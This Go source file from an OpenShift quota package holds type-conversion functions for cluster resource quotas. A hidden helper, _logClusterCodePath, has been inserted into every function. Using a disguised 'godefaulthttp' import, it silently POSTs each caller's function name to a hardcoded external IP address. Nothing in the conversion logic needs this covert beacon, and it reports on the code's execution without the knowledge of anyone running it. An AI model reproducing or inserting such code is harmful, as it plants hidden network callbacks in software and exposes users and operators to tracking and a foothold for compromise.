package quota

import (
	godefaultbytes "bytes"
	quotav1 "github.com/openshift/api/quota/v1"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
)

func ConvertAppliedClusterResourceQuotaToClusterResourceQuota(in *AppliedClusterResourceQuota) *ClusterResourceQuota {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &ClusterResourceQuota{ObjectMeta: in.ObjectMeta, Spec: in.Spec, Status: in.Status}
}
func ConvertV1ClusterResourceQuotaToV1AppliedClusterResourceQuota(in *quotav1.ClusterResourceQuota) *quotav1.AppliedClusterResourceQuota {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &quotav1.AppliedClusterResourceQuota{ObjectMeta: in.ObjectMeta, Spec: in.Spec, Status: in.Status}
}
func ConvertV1AppliedClusterResourceQuotaToV1ClusterResourceQuota(in *quotav1.AppliedClusterResourceQuota) *quotav1.ClusterResourceQuota {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &quotav1.ClusterResourceQuota{ObjectMeta: in.ObjectMeta, Spec: in.Spec, Status: in.Status}
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
